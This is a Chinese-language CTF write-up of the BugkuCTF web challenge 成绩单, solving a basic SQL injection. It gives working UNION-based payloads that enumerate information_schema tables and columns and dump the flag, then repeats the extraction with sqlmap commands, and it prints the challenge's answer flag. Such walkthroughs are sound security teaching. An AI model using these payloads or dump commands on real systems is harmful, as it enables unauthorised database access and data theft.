---
title: BugkuCTF-web-成绩单 WP
date: 2019-07-12 13:10:26
tags: CTF WEB
categories: CTF做题记录
---

>最基本的SQL注入
<!--more-->
---
# 题目描述
解题传送门：http://123.206.87.240:8002/chengjidan/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712114629614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
# 解题思路
查看源码可以知道，name为id，且为post传参
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712120659342.png)
用火狐的hackbar，查几个试试，试了一下，只有三个数据
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712120833652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
那么，id后面加个`'`看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712120934791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
报错了，哪加个`'#`呢，又恢复正常了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712121104208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
SQL注入，稳了，两种解法

 - 方法一、手工注入

在手工注入之前要先知道一些小知识点，拿小本本记下来
1、
MySql在5.0版本后新增一个叫`information_schema`的虚拟数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。利用这个，我们可以获取表名，列名等
2、
查询中用到的`group_concat()`函数是要把查询的内容联合到一起方便查看的，这样就不需要limit 0,1一个一个判断了
ok，科普完毕

先查个字段，由于有三个数据，就直接先用4吧`order by 4#`
![返回正常](https://img-blog.csdnimg.cn/20190712121252251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
返回正常，`order by 5#`呢
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712121436176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
没有回显，那么可以确定，字段就是4个了，接下来，暴库名
`id=-1' union select 1,2,3,4`//把id变为-1是因为如果id有回显的话，我们查询的东西就不能能显示了，所以要换一个id没有东西的数值
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019071212184662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
知道他们出现的位置了，接下来才是真的暴库，哈哈
`id=-1' union select 1,database(),user(),version()#`
得到数据库名`skctf_flag`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712122114105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
然后暴表名（固定格式）
`id=-1' union select 1,group_concat(table_name),user(),version() from information_schema.tables where table_schema=database()#`
得到两个表名`fl4g,sc`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712122632374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
接下来就是暴列名了
`id=-1' union select 1,group_concat(column_name),user(),version() from information_schema.columns where table_name='fl4g'#`
取得列名为`skctf_flag`
ps：表明单引号要用英文`''`，不加也可以，但表名要用十六进制
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712123918476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
最后就是查询数据了
`id=-1' union select 1,skctf_flag,user(),version() from fl4g#`
得到FLAG`BUGKU{Sql_INJECT0N_4813drd8hz4}`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712124312300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
\----------------------------------------------------------------------------------------------------------
 - 方法二、sqlmap跑
 对话框输入1，然后抓包，并点击`Copy to file`保存，我保存到了E盘下
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712124658631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
 指定文件名及类型，保存为txt即可
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019071212480683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
 然后掏出sqlmap开始暴库
 `sqlmap.py -r E:\a.txt -p id --dbs`或者
 `sqlmap.py -r "E:\a.txt" -p id --current-db`
 -r -->打开指定文件
 -p -->指定注入参数
 --current-db（两个-） 或 --dbs-->暴库名
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712125518230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
 暴表名 `sqlmap.py -r E:\a.txt -p id -D skctf_flag --tables`
 -D -->指定数据库
 --tables(两个-) -->列出当前数据库的表
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712125746676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
 暴列名，很明显，flag在fl4g的表中
 `sqlmap.py -r E:\a.txt -p id -D skctf_flag -T fl4g --column`
 -T -->指定表名
 --column（两个-）-->列出当前表的列
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712130026221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
 最后下载数据
 `sqlmap.py -r E:\a.txt -p id -D skctf_flag -T fl4g -C skctf_flag --dump`
 -C -->指定列名
 --dump（两个-）-->下载数据
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190712130226235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
 ----
 # END
